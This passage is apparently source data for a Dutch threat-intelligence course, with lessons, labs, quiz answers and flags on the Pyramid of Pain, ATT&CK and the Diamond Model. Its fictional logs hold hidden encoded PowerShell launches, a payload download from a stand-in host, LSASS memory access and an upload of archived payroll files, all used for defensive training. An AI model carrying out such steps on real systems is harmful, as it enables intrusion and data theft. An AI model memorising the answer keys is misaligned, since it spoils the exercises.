          explain: 'Beide C2-domeinen wijzen naar 203.0.113.30. Vanaf dat adres kun je verder zoeken naar nog meer domeinen en slachtoffers.' },
      ],
    },

    {
      title: 'Taak 5 — De Pyramid of Pain: prioriteit geven',
      tryFirst: true,
      intro: `<p>Dezelfde aanvaller kwam drie keer langs, elke keer met een nieuw bestand en een nieuwe server. In het lab bouw
        je een detectieregel. Probeer eerst een regel op de hash, dan één op het gedrag, en kijk wat het verschil is.</p>`,
      content: `
        <p>Je hebt nu modellen om een aanval te beschrijven (Kill Chain, ATT&amp;CK) en te verbinden (Diamond). De
        <strong>Pyramid of Pain</strong> van David Bianco (2013) beantwoordt een andere vraag: <em>waar steek ik mijn
        energie in?</em> Het rangschikt de indicatoren die je kunt detecteren naar hoeveel <strong>pijn</strong> het de
        aanvaller kost om eromheen te werken. De piramide zelf komt ook in de room "Threat intelligence &amp; MITRE
        ATT&amp;CK" voorbij; hier gebruiken we hem om te <em>prioriteren</em>.</p>

        <h3>Van onder naar boven</h3>
        <ol>
          <li><strong>Hashwaarden</strong> — triviaal: één bit in een bestand wijzigen geeft een totaal nieuwe hash.</li>
          <li><strong>IP-adressen</strong> — makkelijk: een nieuwe server is zo gehuurd.</li>
          <li><strong>Domeinnamen</strong> — simpel: een nieuw domein is zo geregistreerd.</li>
          <li><strong>Netwerk- en hostartefacten</strong> — vervelend: de aanvaller moet zijn tooling aanpassen.</li>
          <li><strong>Tools</strong> — uitdagend: nieuwe tools bouwen of kopen kost tijd en geld.</li>
          <li><strong>TTP's</strong> — zwaar: zijn hele werkwijze omgooien raakt hem het hardst.</li>
        </ol>

        <h3>Hoe je er prioriteit mee geeft</h3>
        <p>Onderaan de piramide zijn indicatoren <em>goedkoop en snel</em> in te zetten, maar ze <em>verlopen</em> ook
        snel: een IP van vorige maand is misschien allang van een onschuldige website. Bovenaan is detectie <em>duur om te
        bouwen</em>, maar <em>duurzaam</em>: een regel op gedrag vangt de aanvaller ook met een nieuwe server en een nieuw
        bestand. Een slimme aanpak combineert beide:</p>
        <table>
          <thead><tr><th>Niveau</th><th>Actie</th><th>Karakter</th></tr></thead>
          <tbody>
            <tr><td>Hashes, IP's, domeinen</td><td>Blokkeren en terugzoeken in logs</td><td>Snel, goedkoop, kort houdbaar</td></tr>
            <tr><td>Artefacten en tools</td><td>Gerichte detectieregels (Sigma, YARA)</td><td>Middelmatig, langer houdbaar</td></tr>
            <tr><td>TTP's</td><td>Gedragsdetectie, gekoppeld aan ATT&amp;CK</td><td>Duur om te bouwen, blijvend effect</td></tr>
          </tbody>
        </table>
        <p>Zo zie je ook meteen de link met de andere modellen: de TTP's bovenaan de piramide zijn precies de technieken
        die ATT&amp;CK codeert, en het vermogen (Capability) uit het Diamond Model. De Pyramid of Pain vertelt je waar in
        die modellen je investering het meeste rendement oplevert.</p>

        <div class="callout warn">
          <strong>Let op:</strong> "hoog in de piramide" betekent niet "laat de onderkant vallen". IOC's vangen de luie
          aanvaller snel en goedkoop. Het punt is balans: snelle blokkades onderaan, plus duurzame gedragsdetectie
          bovenaan.
        </div>
      `,
      lab: {
        type: 'detectrule',
        title: 'drie bezoeken van dezelfde aanvaller',
        scenario: 'Zeven procesgebeurtenissen van werkstations. Drie zijn van de aanvaller, vier zijn gewoon werk. PayloadHash is de hash van het bestand dat de aanvaller meebracht.',
        fields: ['PayloadHash', 'DestIP', 'ParentImage', 'Image', 'CommandLine'],
        events: [
          { label: 'ma 09:14 WS-12', malicious: true, fields: { PayloadHash: 'aa11c9f0', DestIP: '203.0.113.5', ParentImage: 'winword.exe', Image: 'powershell.exe', CommandLine: 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A' } },
          { label: 'ma 10:02 WS-03', malicious: false, fields: { PayloadHash: '-', DestIP: '-', ParentImage: 'explorer.exe', Image: 'powershell.exe', CommandLine: 'powershell.exe Get-ChildItem C:\\Rapporten' } },
          { label: 'di 08:40 WS-07', malicious: false, fields: { PayloadHash: '-', DestIP: '192.0.2.10', ParentImage: 'beheer-agent.exe', Image: 'powershell.exe', CommandLine: 'powershell.exe -enc RwBlAHQALQBTAGUAcgB2AGkAYwBlAA==' } },
          { label: 'wo 11:27 WS-21', malicious: true, fields: { PayloadHash: 'bb22d7e4', DestIP: '203.0.113.99', ParentImage: 'winword.exe', Image: 'powershell.exe', CommandLine: 'powershell.exe -w hidden -enc aQBlAHgAIAAoAGkAdwByACAA' } },
          { label: 'wo 13:05 WS-12', malicious: false, fields: { PayloadHash: '-', DestIP: '-', ParentImage: 'winword.exe', Image: 'splwow64.exe', CommandLine: 'splwow64.exe 12288' } },
          { label: 'do 15:48 WS-09', malicious: false, fields: { PayloadHash: '-', DestIP: '-', ParentImage: 'explorer.exe', Image: 'winword.exe', CommandLine: 'winword.exe /n Offerte.docx' } },
          { label: 'vr 09:33 WS-16', malicious: true, fields: { PayloadHash: 'cc33e1a8', DestIP: '198.51.100.7', ParentImage: 'excel.exe', Image: 'powershell.exe', CommandLine: 'powershell.exe -w hidden -enc JABjAD0ATgBlAHcALQBPAGIA' } },
        ],
        solution: [{ field: 'CommandLine', op: 'bevat', value: '-w hidden' }],
        flag: 'NM{regel_op_gedrag}',
      },
      questions: [
        { q: 'Welk niveau onderaan de Pyramid of Pain kan een aanvaller het makkelijkst veranderen?', options: ['Hashwaarden', 'Tools', 'TTP\'s', 'Netwerkartefacten'], answer: 0, explain: 'Eén bit wijzigen geeft al een nieuwe hash: voor de aanvaller bijna gratis.' },
        { q: 'Maak een regel "PayloadHash is aa11c9f0" (de hash van maandag). Hoeveel van de drie kwaadaardige events vangt die regel?', answer: ['1'],
          hints: ['Voeg de voorwaarde toe en kijk naar de teller voor true positives.', 'Vergelijk de PayloadHash van de drie kwaadaardige events.', 'Elke keer een ander bestand, dus een andere hash.'],
          wrong: { '3': 'Kijk naar de kolom PayloadHash: woensdag en vrijdag bracht de aanvaller een ander bestand mee.', '0': 'De regel vangt in elk geval het event van maandag, waar de hash vandaan komt.' },
          why: 'Een hash blokkeren is nuttig voor vandaag, maar het is een regel tegen één bestand. De aanvaller kost het een paar seconden om hem waardeloos te maken.',
          explain: 'Eén. De hash stopt alleen het bestand van maandag; op woensdag en vrijdag was het bestand, en ook het IP-adres, anders.' },
        { q: 'Bouw een regel die alle drie de kwaadaardige events vangt zonder vals-positieven. Welke vlag krijg je?', answer: ['NM{regel_op_gedrag}'],
          hints: ['Zoek wat de drie kwaadaardige events gemeen hebben dat geen enkel goedaardig event heeft.', 'Hash, IP-adres en ouderproces wisselen. Kijk naar de opdrachtregel.', 'Alle drie starten PowerShell met een verborgen venster: -w hidden.'],
          wrong: { '/^nm\\{.*hash/': 'Een regel op de hash vangt maar één van de drie.' },
          explain: 'CommandLine bevat "-w hidden" vangt alle drie. Dat is gedrag (hoog in de piramide): de aanvaller moet zijn werkwijze aanpassen om eromheen te komen.' },
        { q: 'Vervang je regel door "CommandLine bevat -enc". Hoeveel vals-positieven (FP) geeft dat?', answer: ['1'],
          hints: ['Kijk naar de teller FP nadat je de voorwaarde hebt toegevoegd.', 'Welk goedaardig event gebruikt ook een gecodeerd commando?', 'Het is het beheerscript van dinsdag.'],
          wrong: { '0': 'Het beheerscript van dinsdag (ouderproces beheer-agent.exe) gebruikt ook -enc.' },
          explain: 'Eén: de beheer-agent draait een gecodeerd PowerShell-commando. Gedragsregels vangen meer, maar raken ook legitiem beheer. Afstemmen hoort erbij.' },
      ],
    },

    {
      title: 'Taak 6 — De modellen naast elkaar',
      tryFirst: true,
      intro: `<p>Zestien begrippen, vier modellen. Zet in het lab elk begrip bij het model waar het thuishoort. Het lab meldt
        het als drie van de vier kloppen.</p>`,
      content: `
        <p>Je hebt vier modellen gezien. De kunst is niet om er één te kiezen, maar om te weten <em>welk model welke vraag
        het beste beantwoordt</em> — en ze te combineren. Elk model is een stukje van dezelfde puzzel.</p>

        <h3>Welk model voor welke vraag?</h3>
        <table>
          <thead><tr><th>Model</th><th>Beantwoordt vooral</th><th>Sterk punt</th><th>Zwak punt</th></tr></thead>
          <tbody>
            <tr><td><strong>Cyber Kill Chain</strong></td><td>"In welke fase zit de aanval, en waar kan ik ingrijpen?"</td><td>Simpel, goed uit te leggen, nadruk op vroeg stoppen</td><td>Grof na de inbraak; alles erna is één fase</td></tr>
            <tr><td><strong>MITRE ATT&amp;CK</strong></td><td>"Welk gedrag zie ik precies, en dek ik dat af?"</td><td>Zeer gedetailleerd, gedeelde codes, sterk ná binnenkomst</td><td>Zo gedetailleerd dat je door de bomen het bos kunt verliezen</td></tr>
            <tr><td><strong>Diamond Model</strong></td><td>"Hoe hangen de elementen samen, en welke zaken horen bij elkaar?"</td><td>Verbinden en pivoten; basis voor attributie</td><td>Zegt weinig over volgorde of tijd van de stappen</td></tr>
            <tr><td><strong>Pyramid of Pain</strong></td><td>"Waar levert mijn detectie het meeste op?"</td><td>Helder prioriteren van investeringen</td><td>Is geen beschrijving van de aanval zelf</td></tr>
          </tbody>
        </table>

        <h3>Hoe ze samenwerken</h3>
        <ul>
          <li>De <strong>Kill Chain-fasen</strong> geven de grote lijn; onder elke fase hang je de concrete
          <strong>ATT&amp;CK-technieken</strong> die je zag.</li>
          <li>Elke gebeurtenis plaats je als een <strong>diamant</strong>, en de reeks diamanten (de activity thread) legt
          je naast de Kill Chain. Gedeelde hoekpunten verbinden losse zaken.</li>
          <li>De <strong>Pyramid of Pain</strong> vertelt je vervolgens welke van al die kenmerken het blokkeren of
          detecteren waard zijn, en in welke volgorde.</li>
        </ul>
        <p>Een threat-intelrapport gebruikt daarom zelden maar één model. Een goed rapport zegt bijvoorbeeld: "In de
        Delivery-fase (Kill Chain) zagen we T1566.001 (ATT&amp;CK); het sturende mailaccount en C2-domein (Infrastructure,
        Diamond) delen we als IOC's om snel te blokkeren (onderkant Pyramid), en we schrijven een gedragsregel op het
        PowerShell-patroon (bovenkant Pyramid)."</p>

        <div class="callout info">
          <strong>Kerngedachte:</strong> modellen zijn complementair. De Kill Chain vertelt <em>wanneer</em>, ATT&amp;CK
          <em>wat</em>, het Diamond Model <em>hoe het samenhangt</em>, en de Pyramid of Pain <em>waar je op inzet</em>.
        </div>
      `,
      lab: {
        type: 'connections',
        title: 'welk begrip bij welk model',
        prompt: 'Groepeer de zestien begrippen per model: Cyber Kill Chain, MITRE ATT&CK, Diamond Model en Pyramid of Pain.',
        flag: 'NM{vier_brillen_een_aanval}',
        groups: [
          { name: 'Cyber Kill Chain', items: ['Weaponization', 'Delivery', 'Installation', 'Actions on Objectives'] },
          { name: 'MITRE ATT&CK', items: ['T1059.001', 'Credential Access', 'Sub-techniek', 'Navigator-heatmap'] },
          { name: 'Diamond Model', items: ['Adversary', 'Victim', 'Activity thread', 'Socio-politieke as'] },
          { name: 'Pyramid of Pain', items: ['Hashwaarden', 'Domeinnamen', 'Hostartefacten', 'Tools'] },
        ],
      },
      questions: [
        { q: 'Welk model is het meest gedetailleerd over wat er NÁ het binnenkomen gebeurt?', options: ['MITRE ATT&CK', 'Cyber Kill Chain', 'Pyramid of Pain', 'Geen van alle'], answer: 0, explain: 'De Kill Chain vat alles na de inbraak samen in één fase; ATT&CK beschrijft juist dat deel heel gedetailleerd.' },
        { q: 'Welk model is het sterkst in het verbinden van losse incidenten tot één campagne?', options: ['Het Diamond Model', 'De Cyber Kill Chain', 'De Pyramid of Pain', 'CVSS'], answer: 0, explain: 'Door te pivoten langs gedeelde hoekpunten bundel je diamanten tot een activity group.' },
        { q: 'Welke vlag geeft het lab als alle zestien begrippen bij het juiste model staan?', answer: ['NM{vier_brillen_een_aanval}'],
          hints: ['Begin met de groep waar je zeker van bent, bijvoorbeeld alles wat een fase is.', 'Een ID met een T hoort bij ATT&CK. Rollen in een gebeurtenis (wie, tegen wie) horen bij de diamant. Soorten indicatoren horen bij de piramide.', 'Kill Chain: Weaponization, Delivery, Installation, Actions on Objectives. Piramide: Hashwaarden, Domeinnamen, Hostartefacten, Tools.'],
          explain: 'De Kill Chain levert fasen, ATT&CK gecodeerd gedrag, het Diamond Model de elementen van een gebeurtenis en de Pyramid of Pain soorten indicatoren.' },
      ],
    },

    {
      title: 'Taak 7 — Slotopdracht: één gebeurtenis in alle modellen',
      tryFirst: true,
      intro: `<p>Twee onderdelen. Eerst plaats je één phishingmail (zie de uitleg) in alle vier de modellen. Daarna gebruik je de
        tijdlijn in het lab, van een tweede incident bij Installatiebedrijf Hoekstra, voor de laatste twee vragen. Daar
        staat geen stappenplan bij.</p>`,
      content: `
        <p>Tijd om alles samen te brengen. Je krijgt één concrete, fictieve gebeurtenis en plaatst die door elke bril
        tegelijk: welke Kill Chain-fase, welke ATT&amp;CK-techniek, welk Diamond-hoekpunt en welk Pyramid-niveau? Zo voel
        je dat elk model een ander stukje van dezelfde gebeurtenis beschrijft.</p>

        <h3>De gebeurtenis</h3>
        <div class="callout info">
          <strong>Waarneming (bekend):</strong> De aanvaller stuurt een nepfactuur met een kwaadaardige ZIP-bijlage
          (MD5 <code>3abad12a9579508025468c528c47a68c</code>) naar een medewerker. De mail komt binnen vanaf het account
          <code>facturen[at]boos[.]nm[.]lab</code> en wordt in de inbox afgeleverd.
        </div>

        <h3>Dezelfde gebeurtenis, vier lenzen</h3>
        <table>
          <thead><tr><th>Model</th><th>Vraag</th><th>Plaatsing</th></tr></thead>
          <tbody>
            <tr><td>Cyber Kill Chain</td><td>Welke fase?</td><td>De bijlage wordt afgeleverd, dus fase ...</td></tr>
            <tr><td>MITRE ATT&amp;CK</td><td>Welke techniek?</td><td>Een gerichte mail met bijlage: ...</td></tr>
            <tr><td>Diamond Model</td><td>Welk hoekpunt is de bijlage/malware zelf?</td><td>Het middel waarmee hij zijn doel bereikt: ...</td></tr>
            <tr><td>Pyramid of Pain</td><td>Op welk niveau staat de MD5 van de bijlage?</td><td>Een bestandshash: ...</td></tr>
          </tbody>
        </table>

        <h3>Let op het verschil</h3>
        <p>De vier antwoorden gaan over dezelfde mail, maar belichten iets anders. De Kill Chain zegt <em>wanneer</em> in
        de aanval dit gebeurt. ATT&amp;CK zegt <em>welk</em> gedrag het precies is. Het Diamond Model plaatst de bijlage
        als onderdeel van een groter geheel (de capability van de tegenstander). En de Pyramid of Pain waarschuwt: de
        <strong>hash</strong> staat onderaan, dus die blokkeer je wel snel, maar de aanvaller wisselt hem morgen. Wil je
        hem echt pijn doen, dan schrijf je een regel op de <strong>werkwijze</strong> (de TTP), bovenaan de piramide.</p>

        <p>Dit is de kern van threat intelligence-modellen: niet "welk model is het beste?", maar "welke bril geeft mij nu
        het antwoord dat ik nodig heb?". Noteer de laatste vlag als bewijs dat je de gebeurtenis door alle vier de modellen
        kunt bekijken: <code>NM{een_gebeurtenis_vier_lenzen}</code>.</p>

        <div class="callout tip">
          <strong>Wat je meeneemt:</strong> de Kill Chain geeft de fase, ATT&amp;CK het precieze gedrag, het Diamond
          Model de samenhang en de Pyramid of Pain de prioriteit. Samen zijn ze veel sterker dan elk afzonderlijk.
        </div>
      `,
      lab: {
        type: 'timeline',
        title: 'Installatiebedrijf Hoekstra, 14 september 2026 (UTC)',
        events: [
          { t: '2026-09-14 07:31:02', src: 'Security', host: 'WS-ADM-07', user: 'm.dijkstra', desc: '4624 aanmelding type 2 (interactief)' },
          { t: '2026-09-14 07:44:18', src: 'Proxy', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'GET https://intranet.hoekstra.example/rooster (200)' },
          { t: '2026-09-14 07:52:10', src: 'Mailgateway', host: 'MX-01', user: 'm.dijkstra', desc: 'Mail "Herinnering factuur 2026-0412" van boekhouding[at]hoekstra-facturen[.]nm[.]lab afgeleverd, bijlage Herinnering_factuur.docm' },
          { t: '2026-09-14 07:58:31', src: 'Sysmon', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'WINWORD.EXE opent Herinnering_factuur.docm' },
          { t: '2026-09-14 07:58:49', src: 'Sysmon', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'WINWORD.EXE start powershell.exe -w hidden -enc aQB3AHIAIABoAHQAdABwADoA' },
          { t: '2026-09-14 07:59:02', src: 'Proxy', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'GET hxxp://update-check[.]nm[.]lab/l.bin (200, 412 kB)' },
          { t: '2026-09-14 07:59:20', src: 'Sysmon', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'Bestand aangemaakt: C:\\Users\\m.dijkstra\\AppData\\Roaming\\svcupd.exe' },
          { t: '2026-09-14 07:59:41', src: 'Security', host: 'WS-ADM-07', user: 'm.dijkstra', desc: '4698 geplande taak "OfficeUpdateCheck" aangemaakt: start svcupd.exe bij elke aanmelding' },
          { t: '2026-09-14 08:00:41', src: 'Firewall', host: 'WS-ADM-07', desc: 'uit naar 203.0.113.120:443, 1,2 kB' },
          { t: '2026-09-14 08:01:41', src: 'Firewall', host: 'WS-ADM-07', desc: 'uit naar 203.0.113.120:443, 1,2 kB' },
          { t: '2026-09-14 08:02:41', src: 'Firewall', host: 'WS-ADM-07', desc: 'uit naar 203.0.113.120:443, 1,2 kB' },
          { t: '2026-09-14 08:03:41', src: 'Firewall', host: 'WS-ADM-07', desc: 'uit naar 203.0.113.120:443, 1,2 kB' },
          { t: '2026-09-14 08:10:05', src: 'Security', host: 'WS-VERK-02', user: 'j.bos', desc: '4624 aanmelding type 2 (interactief)' },
          { t: '2026-09-14 08:15:30', src: 'Proxy', host: 'WS-VERK-02', user: 'j.bos', desc: 'GET https://leverancier-portaal.example/prijslijst (200)' },
          { t: '2026-09-14 08:31:07', src: 'Sysmon', host: 'WS-ADM-07', user: 'm.dijkstra', desc: 'svcupd.exe opent het geheugen van lsass.exe (toegangsmasker 0x1010)' },
          { t: '2026-09-14 08:47:12', src: 'Security', host: 'FS-01', user: 'backup-svc', desc: '4624 aanmelding type 5 (service), nachtelijke back-up rondt af' },
          { t: '2026-09-14 09:12:55', src: 'Security', host: 'FS-01', user: 'adm.beheer', desc: '4624 aanmelding type 10 (RDP) vanaf WS-ADM-07' },
          { t: '2026-09-14 09:26:40', src: 'Sysmon', host: 'FS-01', user: 'adm.beheer', desc: 'cmd.exe: dir D:\\HR /s' },
          { t: '2026-09-14 09:40:13', src: 'Sysmon', host: 'FS-01', user: 'adm.beheer', desc: '7z.exe a -p loon.7z D:\\HR\\loonstroken' },
          { t: '2026-09-14 09:52:30', src: 'Proxy', host: 'FS-01', user: 'adm.beheer', desc: 'POST hxxps://bestand-delen[.]example/upload (38 MB)' },
          { t: '2026-09-14 10:05:00', src: 'Security', host: 'WS-VERK-02', user: 'j.bos', desc: '4634 afmelding' },
        ],
      },
      questions: [
        { q: 'In welke fase van de Cyber Kill Chain hoort "de kwaadaardige bijlage wordt in de inbox afgeleverd"?', options: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation'], answer: 2, explain: 'De bezorging van het wapen aan het slachtoffer is de Delivery-fase. Pas als de medewerker de bijlage opent, begint Exploitation.' },
        { q: 'Welke ATT&CK-techniek-ID hoort bij deze gerichte phishingmail met bijlage?', answer: ['T1566.001', 'T1566'], hint: 'Spearphishing Attachment (of de overkoepelende techniek Phishing).', explain: 'T1566.001 Spearphishing Attachment; de overkoepelende techniek is T1566 Phishing. Beide goed.' },
        { q: 'In welk hoekpunt van het Diamond Model plaats je de kwaadaardige bijlage zelf (het middel waarmee de aanvaller zijn doel bereikt)?', options: ['Adversary', 'Capability', 'Infrastructure', 'Victim'], answer: 1, explain: 'De malware/bijlage is de Capability (het vermogen). Het mailaccount waarmee hij verstuurt, is Infrastructure.' },
        { q: 'In de Pyramid of Pain: op welk niveau staat de MD5-hash van de bijlage?', answer: ['Hashwaarden', 'hashwaarden', 'hashes', 'hash', 'hashwaarde'], hint: 'Het allerlaagste niveau, het makkelijkst voor de aanvaller om te wisselen.', explain: 'Een bestandshash staat onderaan: snel te blokkeren, maar de aanvaller verandert hem zo. De vlag NM{een_gebeurtenis_vier_lenzen} staat in de taaktekst.' },
        { q: 'Tijdlijn: welk ATT&CK-techniek-ID hoort bij de gebeurtenis van 09:52:30?', answer: ['T1567', 'T1567.002'],
          hints: ['Bepaal eerst wat er gebeurt: er gaat 38 MB naar buiten.', 'Kijk waar de data heen gaat: naar het adres van de beacons, of ergens anders? De keuzelijst van het lab in taak 3 heeft twee exfiltratietechnieken.', 'De bestemming is een publieke deeldienst op het web.'],
          wrong: { 't1041': 'Dat is exfiltratie over het C2-kanaal. Het C2-adres is 203.0.113.120; deze upload gaat naar een publieke deeldienst.', 't1560': 'Dat was de stap ervoor: het inpakken met 7z om 09:40:13.', 't1071': 'Dat is het gebruik van een gewoon protocol voor C2. Hier wordt data weggestuurd.' },
          explain: 'T1567 Exfiltration Over Web Service: de buit gaat naar een gewone webdienst, niet over het C2-kanaal. Dat valt minder op tussen normaal verkeer.' },
        { q: 'Tijdlijn: op één moment zorgt de aanvaller dat hij een herstart overleeft. Bepaal bij welke Kill Chain-fase die gebeurtenis hoort en geef het ATT&CK-techniek-ID ervan.', boss: true,
          answer: ['T1053', 'T1053.005'],
          hints: ['Zoek in de tijdlijn de gebeurtenis die niets doet op het moment zelf, maar iets regelt voor later.', 'Het is een gebeurtenis uit het Security-log, vlak nadat het bestand svcupd.exe is neergezet. Zoek de bijbehorende techniek in de keuzelijst van het lab in taak 3.', 'Het gaat om een geplande taak (Scheduled Task/Job).'],
          wrong: { 't1547': 'Dat is automatisch starten via bijvoorbeeld een Run-sleutel of de opstartmap. Hier maakt de aanvaller een geplande taak aan (event 4698).', 't1105': 'Dat is het binnenhalen van het bestand om 07:59:02. Daarmee is nog niet geregeld dat het na een herstart weer start.', 't1059.001': 'Dat is de uitvoering via PowerShell om 07:58:49: de fase Exploitation, niet Installation.', 't1059': 'Dat is de uitvoering via PowerShell om 07:58:49: de fase Exploitation, niet Installation.' },
          why: 'Zolang dit mechanisme er staat, komt de aanvaller terug, ook nadat het werkstation is herstart of het wachtwoord is gewijzigd. Bij het opruimen is dit wat je niet mag missen.',
          explain: 'Om 07:59:41 wordt de geplande taak "OfficeUpdateCheck" aangemaakt. In de Kill Chain is dat Installation, in ATT&CK T1053 Scheduled Task/Job (sub-techniek T1053.005, Scheduled Task).' },
      ],
    },

    {
      title: 'Taak 8: Waar de modellen wringen',
      kind: 'verdieping', optional: true,
      content: `
        <p>Elk model in deze room is een vereenvoudiging, gemaakt voor een bepaald doel. Wie weet waar ze wringen, gebruikt ze
        beter en laat zich er minder door misleiden.</p>

        <h3>Cyber Kill Chain: gebouwd rond malware die van buiten komt</h3>
        <p>Het model uit 2011 gaat uit van een aanvaller die een wapen bouwt en bezorgt. Koopt iemand een geldig wachtwoord en
        logt hij daarmee in op een VPN of clouddienst, dan is er geen wapen, geen bezorging en geen exploit. Fasen worden dan
        overgeslagen of zijn onzichtbaar, en het "verbreek één schakel"-idee biedt weinig houvast. Aanvallen verlopen ook
        niet altijd in één rechte lijn: na de eerste toegang herhaalt een aanvaller verkennen, rechten verhogen en
        verplaatsen vaak meerdere keren. Latere uitwerkingen, zoals de Unified Kill Chain (Paul Pols, 2017), voegen daarom
        fasen toe voor wat er binnen het netwerk gebeurt.</p>

        <h3>ATT&amp;CK: dekking is geen bescherming</h3>
        <ul>
          <li><strong>Eén techniek, veel procedures.</strong> Een regel die <code>powershell.exe -enc</code> vangt, dekt één
          manier af om T1059.001 uit te voeren. Een groen vakje in de Navigator zegt dus weinig zolang je niet weet
          wélke procedures je ziet.</li>
          <li><strong>Eén techniek, meerdere tactieken.</strong> Sommige technieken staan onder meer dan één tactiek. Valid
          Accounts (T1078) is het bekendste voorbeeld. Noteer daarom altijd de tactiek erbij: die zegt wat de aanvaller op
          dat moment wilde.</li>
          <li><strong>De matrix verandert.</strong> ATT&amp;CK krijgt doorgaans twee keer per jaar een nieuwe versie.
          Technieken worden gesplitst, hernoemd of vervallen. Zet in een rapport de gebruikte versie erbij.</li>
          <li><strong>Wat erin staat, is wat is gerapporteerd.</strong> De kennisbank bouwt op openbaar beschreven aanvallen.
          Gedrag dat niemand heeft gepubliceerd, staat er niet in.</li>
        </ul>

        <h3>Diamond Model: de tegenstander blijft vaak leeg</h3>
        <p>In de praktijk vul je Infrastructure, Capability en Victim in, en blijft Adversary lang "onbekend". Dat is geen
        gebrek van je analyse; het is de normale toestand. Een <em>activity group</em> is een cluster van gedrag en
        kenmerken, geen organisatie met leden. Verschillende leveranciers trekken de grenzen anders en geven hun clusters
        eigen namen, waardoor twee namen in twee rapporten over (deels) dezelfde activiteit kunnen gaan.</p>

        <h3>Pyramid of Pain: hoog is duurder voor beide kanten</h3>
        <p>Regels op gedrag raken ook beheerders en legitieme software, zoals je in het lab zag. Hoe hoger in de piramide,
        hoe meer afstemming en onderhoud een regel vraagt. En de piramide rangschikt de moeite voor de aanvaller, niet de
        betrouwbaarheid van de indicator: een verse hash uit je eigen incident is harder bewijs dan een vage
        gedragsbeschrijving uit een rapport van derden.</p>

        <h3>Veelgemaakte fouten</h3>
        <ul>
          <li>Een waarneming koppelen aan een <em>tool</em> ("dit is Cobalt Strike") in plaats van aan gedrag. Een tool is
          geen techniek.</li>
          <li>Alleen de tactiek noteren ("Lateral Movement") zonder techniek. Daar kan niemand een regel op schrijven.</li>
          <li>Een model gebruiken als bewijs. Een ingevulde diamant of een nette keten maakt een aanname niet waar.</li>
        </ul>
      `,
      questions: [
        { q: 'Een SOC heeft voor T1059.001 één regel: die slaat aan op "powershell.exe -enc". Een aanvaller start pwsh.exe met een script vanaf schijf, zonder -enc. Slaat de regel aan? (ja of nee)', answer: ['nee', 'nee.'],
          hints: ['Vergelijk wat de regel zoekt met wat de aanvaller doet.', 'De regel zoekt een procesnaam en een optie. Komen die voor?', 'Andere procesnaam, en geen -enc.'],
          wrong: { 'ja': 'De techniek is dezelfde, maar de procedure niet: een andere procesnaam en geen -enc. De regel zoekt precies die twee dingen.' },
          explain: 'Nee. De techniek is "afgedekt" op de heatmap, maar deze procedure glipt erdoor. Dekking meet je per procedure, niet per vakje.' },
        { q: 'Een aanvaller logt met een gekocht, geldig wachtwoord in op de VPN van een bedrijf. Welke bewering past daarbij?', options: ['De Kill Chain beschrijft dit goed: de fase Weaponization is het kopen van het wachtwoord', 'De fasen Weaponization, Delivery en Exploitation zijn hier afwezig of onzichtbaar, waardoor de Kill Chain weinig houvast geeft', 'Zonder malware is er geen aanval, dus geen enkel model is van toepassing', 'Dit valt buiten ATT&CK, want er wordt geen techniek gebruikt'], answer: 1,
          wrong: { 0: 'Weaponization is het bouwen van een wapen. Een wachtwoord kopen past daar met moeite in; je rekt het model op.', 2: 'Inloggen met gestolen gegevens is een van de meest voorkomende manieren om binnen te komen.', 3: 'ATT&CK heeft hier juist een techniek voor: Valid Accounts (T1078).' },
          explain: 'Het model is gebouwd rond malware die wordt bezorgd. Bij geldige accounts ontbreken die schakels. ATT&CK (T1078) beschrijft dit gedrag wel.' },
        { q: 'Twee leveranciers beschrijven dezelfde reeks inbraken, maar gebruiken elk een andere naam voor de daders. Wat volgt daaruit?', options: ['Er zijn twee verschillende dadergroepen', 'Eén van de twee leveranciers heeft het mis', 'Namen horen bij clusters van waargenomen activiteit; elke leverancier trekt zijn eigen grenzen', 'De inbraken kunnen niet in een Diamond Model worden gezet'], answer: 2,
          wrong: { 0: 'Twee namen betekent twee etiketten, niet per se twee groepen.', 1: 'Beide kunnen kloppen: ze beschrijven wat zij zelf hebben waargenomen.', 3: 'Elke inbraak kan als diamant worden beschreven, ook als de tegenstander onbekend is.' },
          explain: 'Een activity group is een cluster van gedrag en kenmerken. Wie andere waarnemingen heeft, komt tot een ander cluster en geeft het een eigen naam.' },
      ],
    },

    {
      title: 'Taak 9: Zo komt dit voor op een examen',
      kind: 'examen', optional: true,
      content: `
        <p>Examens over threat intelligence toetsen de modellen bijna altijd met een korte casus: je moet een waarneming in het
        juiste vak zetten of kiezen welk model een vraag beantwoordt. De afleiders zijn buurvakjes: de fase ervoor of erna,
        de tactiek in plaats van de techniek, het niveau net eronder.</p>
      `,
      questions: [
        { q: 'Een SOC blokkeert de hash van een kwaadaardig bestand. De volgende dag is dezelfde aanvaller terug met een opnieuw gecompileerd bestand, een nieuw domein en een nieuw IP-adres. Zijn werkwijze is ongewijzigd: een Office-document dat een scriptinterpreter met een verborgen venster start. Op welk niveau van de Pyramid of Pain levert een nieuwe detectieregel het meest duurzame resultaat op?',
          options: ['Domeinnamen', 'IP-adressen', 'Tools', 'TTP\'s'], answer: 3,
          wrong: { 0: 'Het domein is al gewisseld. Een regel op het nieuwe domein werkt tot het volgende bezoek.', 1: 'IP-adressen wisselen nog makkelijker dan domeinen.', 2: 'Verleidelijk, want tools staan hoog. Maar het bestand is opnieuw gecompileerd, dus een regel op kenmerken van de tool kan weer breken. Het enige dat gelijk bleef, is het gedrag.' },
          explain: 'Wat gelijk bleef, is de werkwijze. Een regel op dat gedrag (TTP) blijft werken als bestand, domein en adres veranderen.' },
        { q: 'Een analist onderzoekt twee inbraken bij verschillende organisaties. In beide is dezelfde, niet eerder beschreven achterdeur gevonden. De C2-servers en de slachtoffers hebben niets gemeen. Welke uitspraak past bij het Diamond Model?',
          options: ['Het gedeelde hoekpunt is Adversary; het is dezelfde dader', 'Het gedeelde hoekpunt is Capability; de inbraken zijn kandidaat voor één activity group, maar de dader staat daarmee niet vast', 'Het gedeelde hoekpunt is Infrastructure; de C2-servers moeten dus toch verbonden zijn', 'Er is geen gedeeld hoekpunt; de inbraken moeten apart blijven'], answer: 1,
